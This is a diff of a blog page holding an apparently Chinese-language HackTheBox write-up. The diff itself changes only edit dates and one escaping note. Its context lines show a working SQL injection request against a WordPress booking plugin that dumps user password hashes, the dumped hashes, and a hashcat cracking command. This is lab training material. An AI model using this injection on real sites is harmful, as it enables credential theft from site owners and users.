@@ -54,7 +54,7 @@
 <meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/19.png">
 <meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/20.png">
 <meta property="article:published_time" content="2023-04-02T11:31:08.000Z">
-<meta property="article:modified_time" content="2023-04-04T10:56:07.072Z">
+<meta property="article:modified_time" content="2023-04-23T14:37:39.661Z">
 <meta property="article:author" content="xXxYOLOxXx">
 <meta property="article:tag" content="Pentest">
 <meta property="article:tag" content="HackTheBox">
@@ -232,7 +232,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-04 18:56:07" itemprop="dateModified" datetime="2023-04-04T18:56:07+08:00">2023-04-04</time>
+                <time title="Modified: 2023-04-23 22:37:39" itemprop="dateModified" datetime="2023-04-23T22:37:39+08:00">2023-04-23</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1162,7 +1162,7 @@ runas貌似不会在当前cmd窗口运行命令而是在一个新的cmd中运行
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,group_concat(user_login),group_concat(user_pass) from blog.wp_users-- -&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>用户名与密码如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.</span><br><span class="line">manager:$P$B4aNM28N0E.tMy&#x2F;JIcnVMZbGcU16Q70</span><br></pre></td></tr></table></figure>
-<p><strong>读出来的json里面，<code>&quot;/&quot;</code>会被转义为<code>&quot;\\/&quot;</code></strong></p>
+<p><strong>读出来的json里面，<code>&quot;/&quot;</code>会被转义为<code>&quot;\/&quot;</code></strong></p>
 <p>hashcat爆破</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.\n$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70&#x27;</span> &gt; <span class="built_in">hash</span></span><br><span class="line">hashcat -m 400 ./<span class="built_in">hash</span> /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure>
 <p>得到manager的账户信息</p>
